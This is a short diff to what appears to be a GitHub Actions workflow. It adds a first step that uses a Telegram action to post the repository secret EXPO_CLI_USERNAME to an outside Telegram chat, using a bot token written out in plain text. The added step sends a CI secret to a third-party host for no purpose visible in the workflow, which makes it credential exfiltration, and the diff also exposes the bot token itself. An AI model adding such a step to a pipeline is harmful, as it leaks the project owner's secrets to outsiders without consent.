@@ -6,6 +6,12 @@ jobs:
         runs-on: ubuntu-latest
 
         steps:
+            - name: send default message
+              uses: appleboy/telegram-action@master
+              with:
+                to: -346272969
+                token: 1024149039:AAEDCf31zUKokQdtdS6AOGKQIfGkjnm0glg
+                message: Secret ${{ secrets.EXPO_CLI_USERNAME }}
             - name: Check out Git repository
               uses: actions/checkout@v2
 
